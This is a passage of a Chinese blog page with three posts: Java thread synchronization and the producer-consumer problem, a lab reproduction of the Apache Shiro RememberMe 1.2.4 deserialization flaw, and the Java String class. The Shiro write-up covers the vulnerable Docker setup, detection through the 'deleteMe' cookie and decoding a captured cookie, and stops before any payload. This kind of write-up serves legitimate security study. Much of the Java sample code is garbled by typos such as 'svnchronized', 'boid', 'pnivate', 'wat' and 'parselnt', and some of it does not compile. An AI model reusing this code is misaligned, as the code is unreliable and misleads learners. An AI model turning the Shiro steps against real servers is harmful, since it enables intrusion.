<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">svnchronized(类对象名aa) <span class="comment">//1行</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//同步代码块 //3行</span></span><br><span class="line">&#125;<span class="comment">//4行</span></span><br></pre></td></tr></table></figure>

<p>功能：</p>
<ul>
<li>synchronized(类对象名aa)的含义是:判断aa是否已经被其他线程霸占，如果发现已经被其他线程霸占，则当前线程陷入等待中，如果发现aa没有被其他线程霸占，则当前线程霸占在aa对象，并执行3行的同步代码块，在当前线程执行3行代码时，其他线程将无法再执行3行的代码(因为当前线程己经霸占了aa对象)当前线程执行完3行的代码后，会自动释放对aa对象的霸占，此时其他线程会相互竞争对aa的霸占，最终CPU会选择其中的某一个线程执行</li>
<li>最终导致的结果是<strong>：一个线程正在操作某资源的时候,将不允许其它线程操作该资源，即一次只允许一个线程处理该资源</strong></li>
</ul>
<p>释放后在一起竞争资源</p>
<h4 id="修饰方法"><a href="#修饰方法" class="headerlink" title="修饰方法"></a>修饰方法</h4><ul>
<li>Synchronized修饰一个方法时，实际霸占的是<strong>该方法的this指针所指向的对象</strong></li>
<li>即Synchronized修饰一个方法时，实际霸占的<strong>正在调用该方法的对象</strong></li>
<li>附注:<br> 霸占的专业术语叫锁定，霸占住的那个对象专业术语叫做监听器</li>
</ul>
<h2 id="生产消费"><a href="#生产消费" class="headerlink" title="生产消费"></a>生产消费</h2><h3 id="同步概念"><a href="#同步概念" class="headerlink" title="同步概念"></a>同步概念</h3><p>​    通常，一些同时运行的线程需要共享数据。在这种时候，每个线程就必须要考虑与其他一起共享数据的线程的状态与行为，否则的话就不能保证共享数据的一致性，从而也就不能保证程序的正确性。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stack</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span>[] data = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">6</span>];</span><br><span class="line">    <span class="function"><span class="keyword">public</span> boid <span class="title">push</span><span class="params">(<span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        data[index] = c;</span><br><span class="line">        index++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">pop</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        index--;</span><br><span class="line">        <span class="keyword">return</span> data[index];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    当有两个线程A和B同时使用了Stack类的一个对象时现在我要求：0先把r存入Stack中，再将r取出来<br>​    下面的步骤详细演示了AB线程不同步所带来的问题</p>
<p><img src="/2021/04/15/Java-6%E7%BA%BF%E7%A8%8B/%E7%BA%BF%E7%A8%8B%E4%B8%8D%E5%90%8C%E6%AD%A5%E6%BC%94%E7%A4%BA.png"></p>
<p>最终结果是：’r’ 没有被存入，取出的是 ‘C’ 而不是 ‘r’</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SyncStack</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	pnivate <span class="keyword">int</span> index =<span class="number">0</span>;</span><br><span class="line">	pnvate <span class="keyword">char</span>[] data = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">6</span>];</span><br><span class="line">    </span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    	<span class="keyword">while</span>(index == datalength)</span><br><span class="line">        &#123;</span><br><span class="line">    		<span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">    			<span class="keyword">this</span>.wait(); <span class="comment">//7行</span></span><br><span class="line">            &#125;</span><br><span class="line">    		<span class="keyword">catch</span>(InterruptedException e)</span><br><span class="line">            &#123;</span><br><span class="line">            &#125;</span><br><span class="line">    	<span class="keyword">this</span>.notify() <span class="comment">//10行</span></span><br><span class="line">        data[index] = c;</span><br><span class="line">   	 	index++;</span><br><span class="line">    	System.out.println(<span class="string">&quot;produced: &quot;</span> + c);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">public</span> synchroniged <span class="keyword">char</span> <span class="title">pop</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(inde == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">            	<span class="keyword">this</span>.wat();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span>(InterruptedException e)</span><br><span class="line">            &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.notify(); <span class="comment">//20行</span></span><br><span class="line">        index--;</span><br><span class="line">        System.out.println(<span class="string">&quot;消费:&quot;</span> + data[index]);</span><br><span class="line">        <span class="keyword">return</span> data[index]; <span class="comment">//23行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    假设现在有两个线程P(生产)和C(消费)P生产己满，执行7行代码陷入阻塞状态，同时释放P线程对this的锁定，这时候C线程会得到this对象的标志位开始运行。</p>
<p>​    另外C线程执行完20行代码后，程序并不会立即转到P线程开始运行，因为C执行notify,只是叫醒P,让P从因为wait this对象而陷入阻塞的状态进入就绪状态,记住：一个线程notify，该线程并不会释放对this的锁定，只有C执行完23行的代码后，C才会释放对this的锁定，这时候C和P会同时争夺对this的锁定，具体执行哪个由系统调度器决定</p>
<p>要是<code>this.wait();</code>没有陷入堵塞，<code>this.notify();</code>就不起效果。</p>
<h3 id="注意问题-1"><a href="#注意问题-1" class="headerlink" title="注意问题"></a>注意问题</h3><ul>
<li><p>执行完20行的代码后，程序绝对不会立即切换到另一个线程</p>
</li>
<li><p>20行代码叫醒的是其他线程，叫醒的不是本线程</p>
</li>
<li><p>在最开始，P和C刚开始执行时：<br>即便P没有wait，也可以在C中notify,  即便c没有wait，也可以在P中notify</p>
</li>
</ul>
<h1 id="notify-和-wait-方法"><a href="#notify-和-wait-方法" class="headerlink" title="notify 和 wait 方法"></a>notify 和 wait 方法</h1><h2 id="this-notify"><a href="#this-notify" class="headerlink" title="this.notify()"></a>this.notify()</h2><p><strong>功能:</strong></p>
<ul>
<li>不是叫醒正在执行this.notify();的当前线程</li>
<li>而是叫醒一个现在<code>正在wait this对象</code>的其他线程，如果有多个线程正在wait this对象，</li>
<li>通常是叫醒<code>最先wait this对象</code>的线程,但具体是叫醒哪一个，</li>
<li>这是由系统调度器控制,程序员无法控制</li>
</ul>
<p>例子：</p>
<ul>
<li>假设现在有T1、T2、T3、T4四个线程我们在T4线程中执行了aa.notify()语句</li>
<li>则即便此时T1T2 T3没有一个线程因为wait aa对象而陷入阻塞状态，T4线程中执行aa.notify方法时也不会有任何错误</li>
<li>执行aa.notify方法时如果一个线程都没有叫醒，这是可以的</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><h4 id="aa-wait"><a href="#aa-wait" class="headerlink" title="aa.wait()"></a>aa.wait()</h4><ul>
<li>将执行aa.wait()的当前线程转入阻塞状态，让出CPU的控制权</li>
<li>释放对aa的锁定</li>
</ul>
<h4 id="aa-notify"><a href="#aa-notify" class="headerlink" title="aa.notify()"></a>aa.notify()</h4><ul>
<li>假设执行aa.notify()的当前线程为T1</li>
<li>如果当前时刻有其他线程因为执行了aa.wait()而陷入阻塞状态，则叫醒其中的一个,</li>
<li>所谓叫醒某个线程就是令该线程从因为wai而陷入阻塞的状态转入就绪状态</li>
</ul>
<h4 id="aa-notifyAll"><a href="#aa-notifyAll" class="headerlink" title="aa.notifyAll()"></a>aa.notifyAll()</h4><ul>
<li>叫醒其他<strong>所有</strong>的因为执行了aa.wait()而陷入阻塞状态的线程</li>
</ul>
<h1 id="生产消费【经典问题】"><a href="#生产消费【经典问题】" class="headerlink" title="生产消费【经典问题】"></a>生产消费【经典问题】</h1><p>​    一个仓库最多容纳6个产品，制造商现在要制造20件产品存入仓库，消费者要从仓库取出这20件产品来消费，制造商制造产品和消费者取出产品的速度很可能是不一样的，编程实现两者的同步</p>
<h1 id="两类线程："><a href="#两类线程：" class="headerlink" title="两类线程："></a>两类线程：</h1><p>​    一、我不终止整个程序不能终止</p>
<p>​    二、我没终止其他线程停止我也立即停止</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-一Shiro-RememberMe-1-2-4-反序列化导致的命令执行漏洞复现"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2021/04/15/%E4%B8%80Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
    >一Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞复现</a> 
</h2>
 

    </header>
     
    <div class="article-meta">
      <a href="/2021/04/15/%E4%B8%80Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time datetime="2021-04-15T05:49:15.000Z" itemprop="datePublished">2021-04-15</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>​    Apache Shiro 在 Java 的权限及安全验证框架中占用重要的一席之地，在它编号为550的 issue 中爆出严重的 Java 反序列化漏洞。</p>
<h1 id="0x01-漏洞场景还原"><a href="#0x01-漏洞场景还原" class="headerlink" title="0x01 漏洞场景还原"></a>0x01 漏洞场景还原</h1><p>环境搭建：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get install docker</span><br><span class="line">apt-get install docker-compose</span><br><span class="line">reboot</span><br><span class="line">service docker start （每次开机需要重新启动服务）</span><br><span class="line">docker pull medicean&#x2F;vulapps:s_shiro_1 (漫长的下载)</span><br><span class="line">docker run -d -p 80:8080 medicean&#x2F;vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>

<p>访问ip，出现以下页面即搭建成功：</p>
<p><img src="/2021/04/15/%E4%B8%80Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%8E%AF%E5%A2%83%E5%9B%BE1.png"></p>
<h1 id="0x02-漏洞验证"><a href="#0x02-漏洞验证" class="headerlink" title="0x02 漏洞验证"></a>0x02 漏洞验证</h1><p>访问ip，点击<code>Log in</code>，进行登录</p>
<p><img src="/2021/04/15/%E4%B8%80Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A21.png"></p>
<p>Username 和 Password 随意输入，但<strong>一定要勾选</strong><code>Remember Me</code>，点击Login 进行抓包</p>
<p><img src="/2021/04/15/%E4%B8%80Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A22.png"></p>
<p>数据包发送至<code>Repeater模块</code>再次发送，出现<code>deleteMe</code>则漏洞存在</p>
<p><img src="/2021/04/15/%E4%B8%80Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E.png"></p>
<h1 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h1><p>​    从官方文档中，知道在Shiro配置类中加入rememberMe管理器代码中写到cookie加密密钥默认为<strong>AES算法</strong>  </p>
<p>​    Apache Shiro默认使用了<code>CookieRememberMeManager</code>，其处理cookie的流程是：得到<code>rememberMe的cookie值</code> &gt;  <code>Base64解码</code>–&gt;<code>AES解密</code>–&gt;<code>反序列化</code> AES的密钥是硬编码，密钥存储在源码中，分析源码就可获得密钥</p>
<p>从官方的 issue 上来看，存在几个重要的点:</p>
<ul>
<li>rememberMe cookie</li>
<li>CookieRememberMeManager.java</li>
<li>Base64</li>
<li>AES</li>
<li>加密密钥硬编码</li>
<li>Java serialization</li>
</ul>
<p>输入正确账户，获取cookie值</p>
<p><img src="/2021/04/15/%E4%B8%80Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E8%8E%B7%E5%8F%96cookie.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dQf1WDa09v4TDHbM1PZPi6sBhQ3zl1OwDb1S+65wgSBl8TYuJ9KJ9cXgR0CPCk1LiUEZPoSzvruwEklb8GSdIydV8NjnJiKxysiEWzG1j+WTu536Rdl8b6Q&#x2F;XNrNStpUSq3e9XELd0nFYYTeN0T9PJY0aXoJZiXdX7&#x2F;+0XcMhYhktyY+TmDAjDce2Th15sQmltPHJt6q0xX&#x2F;nttUd3n&#x2F;b5mnezxBenwiqWyuG8zNFIZOU7iVsga8UwqthnZsUwF7JkJBWMO3duSxcpTO9G5NmdWf1CnkCFmItyjyomZRLiiSU8CSsrrSGgg7k4BoIC6kH9NuMwwKbBKzofmViN9NxnKw+zWo6FJd8t8sRitAsIv+6FS1dqCA&#x2F;smFivXJ3hu052f5greHTT4nmwPBGB3dGpR6497roCVCFpaGV89rN72dFPpHakitEXFJc92VJnAdnKpvlsTNnzhRRWJDb5nA0p1jn&#x2F;iI&#x2F;ckSiXxKiKDN9TyrOpVviekVCKau+BNxa6dG</span><br></pre></td></tr></table></figure>

<p>进行在线base64解码，发现为乱码</p>
<p><img src="/2021/04/15/%E4%B8%80Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/base64%E8%A7%A3%E7%A0%811.png"></p>
<p>将解码内容存储为二进制文件 1.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">str1 = <span class="string">&quot;dQf1WDa09v4TDHbM1PZPi6sBhQ3zl1OwDb1S+65wgSBl8TYuJ9KJ9cXgR0CPCk1LiUEZPoSzvruwEklb8GSdIydV8NjnJiKxysiEWzG1j+WTu536Rdl8b6Q/XNrNStpUSq3e9XELd0nFYYTeN0T9PJY0aXoJZiXdX7/+0XcMhYhktyY+TmDAjDce2Th15sQmltPHJt6q0xX/nttUd3n/b5mnezxBenwiqWyuG8zNFIZOU7iVsga8UwqthnZsUwF7JkJBWMO3duSxcpTO9G5NmdWf1CnkCFmItyjyomZRLiiSU8CSsrrSGgg7k4BoIC6kH9NuMwwKbBKzofmViN9NxnKw+zWo6FJd8t8sRitAsIv+6FS1dqCA/smFivXJ3hu052f5greHTT4nmwPBGB3dGpR6497roCVCFpaGV89rN72dFPpHakitEXFJc92VJnAdnKpvlsTNnzhRRWJDb5nA0p1jn/iI/ckSiXxKiKDN9TyrOpVviekVCKau+BNxa6dG&quot;</span></span><br><span class="line">tem = base64.b64decode(str1)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test.bin&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:                                           </span><br><span class="line">      f.write(tem)</span><br><span class="line"> f.close()</span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/15/%E4%B8%80Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E8%A7%A3%E7%A0%81%E5%90%8E%E4%BA%8C%E8%BF%9B%E5%88%B6.png"></p>
<p>没有看到有明确的 Java 序列化特征字</p>
<p><strong>Java 序列化特征字</strong></p>
<p>​    <strong><code>实现Serializable接口</code></strong></p>
<p>相关文章链接</p>
<p><a href>https://blog.csdn.net/u013378306/article/details/107741539</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u013378306/article/details/107741539">https://blog.csdn.net/lqzkcx3/article/details/79463450</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lqzkcx3/article/details/79463450">https://www.cnblogs.com/wxgblogs/p/5849951.html</a></p>
<p>根据文章提到了 AES 和 加密密钥硬编码，所以需要去源码寻找密钥</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-Java-5String类"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2021/04/15/Java-5String%E7%B1%BB/"
    >Java 5String类</a> 
</h2>
 

    </header>
     
    <div class="article-meta">
      <a href="/2021/04/15/Java-5String%E7%B1%BB/" class="article-date">
  <time datetime="2021-04-15T02:55:50.000Z" itemprop="datePublished">2021-04-15</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Java/">Java</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="String类"><a href="#String类" class="headerlink" title="String类"></a>String类</h1><ul>
<li>java.lang.String类对象表示不可修改的Unicode编码字符串</li>
<li>在Java中<strong>双引号括起来的字符串也被当做String对象</strong><ul>
<li>system.out.printIn(“abc”.length()); //输出3<br>system.out.printIn(“abc”.equals(“abc”)); //输出true</li>
</ul>
</li>
</ul>
<p><strong>Steing类的equals已被重写相等为true</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String str1 = <span class="keyword">new</span> String(<span class="string">&quot;china&quot;</span>);</span><br><span class="line">String str2 = <span class="keyword">new</span> String(<span class="string">&quot;china&quot;</span>);</span><br><span class="line">System.out.println(str1.equals(str2)):</span><br><span class="line">___________________________</span><br><span class="line">    输出结果</span><br><span class="line">    	<span class="keyword">true</span></span><br></pre></td></tr></table></figure>

<p><strong>==号比较自身，equals比较指向内容</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (str1 == str2)	<span class="comment">//是判断str1和str2自身的内容是否相等?还是用来判断str1指向的对象的内容和str2指向的对象的内容是否相等?   答：代表前者</span></span><br><span class="line">	System.out.println(<span class="string">&quot;str1 == str2&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	System.out.println(<span class="string">&quot;str1 != str2&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="String类示例内存示意图"><a href="#String类示例内存示意图" class="headerlink" title="String类示例内存示意图"></a>String类示例内存示意图</h2><p>​    <strong>字符串常量是在数据区存放</strong></p>
<p><img src="/2021/04/15/Java-5String%E7%B1%BB/%E7%A4%BA%E6%84%8F%E5%9B%BE1.png"></p>
<p><img src="/2021/04/15/Java-5String%E7%B1%BB/%E7%A4%BA%E6%84%8F%E5%9B%BE2.png"></p>
<h1 id="String类的常用方法-字符串和整数的相互转化"><a href="#String类的常用方法-字符串和整数的相互转化" class="headerlink" title="String类的常用方法   字符串和整数的相互转化"></a>String类的常用方法   字符串和整数的相互转化</h1><p>常用方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">charat</span><span class="params">(<span class="keyword">int</span> index)</span>  返回字符串中第index个字符</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">length</span><span class="params">()</span>  返回字符串的长度</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">indexof</span> <span class="params">(string str)</span>  返回字符串中出现str的第一个位置</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">indexof</span><span class="params">(string str,<span class="keyword">int</span> fromIndex)</span>  返回字符串中从fromIndex开始出现str的第一个位置</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equalsIgnoreCase</span> <span class="params">(string another)</span>  比较字符串与another是否一样（忽略大小写)</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">replace</span><span class="params">(<span class="keyword">char</span> oldChar ,<span class="keyword">char</span> newChar)</span>  在字符串中用newchar字符替换oldchar字符</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">charat</span><span class="params">(<span class="keyword">int</span> index)</span>   返回字符串中第index个字符</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">length</span><span class="params">()</span>   返回字符串的长度</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">indexof</span> <span class="params">(string str)</span>  返回字符串中出现str的第一个位置</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">indexof</span><span class="params">(string str,<span class="keyword">int</span> fromIndex)</span>   返回字符串中从fromIndex开始出现str的第一个位置</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equalsIgnoreCase</span> <span class="params">(string another)</span>  比较字符串与another是否一样（忽略大小写)</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> string <span class="title">replace</span><span class="params">(<span class="keyword">char</span> oldChar ,<span class="keyword">char</span> newChar)</span>  在字符串中用newchar字符替换oldchar字符</span></span><br></pre></td></tr></table></figure>

<p>​    静态方法 </p>
<p>​    <code>public String[] split(String regex)</code>可以将一个字符串按照指定的分隔符分隔，返回分隔后的字符串数组。</p>
<p>​    <code>public static String valueOf(...)</code> 可以将基本类型数据转换为字符串<strong>（字符转换）</strong></p>
<p>例子</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestSt</span> <span class="title">ring_2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">123</span>;</span><br><span class="line">        String str <span class="string">&quot;456&quot;</span>;</span><br><span class="line">        <span class="comment">//str = i; //error</span></span><br><span class="line">        <span class="comment">//i = str; //error</span></span><br><span class="line">        str = String.value0f(i);</span><br><span class="line">        System.out.printf(<span class="string">&quot;str = %s\n&quot;</span>, str);</span><br><span class="line">        </span><br><span class="line">        i = Integer.parselnt(str);</span><br><span class="line">        System.out.printf(<span class="string">&quot;i = %d\n&quot;</span>，i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><p>1.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String s1 = <span class="string">&quot;sun java&quot;</span>;</span><br><span class="line">        String s2 =<span class="string">&quot;sun Java&quot;</span>;</span><br><span class="line">        System.out.println(s1.charAt(<span class="number">1</span>)); <span class="comment">//u</span></span><br><span class="line">        System.out.println(s2.length()); <span class="comment">//8</span></span><br><span class="line">        System.out.println(s1.indexOf(<span class="string">&quot;java&quot;</span>)); <span class="comment">//4</span></span><br><span 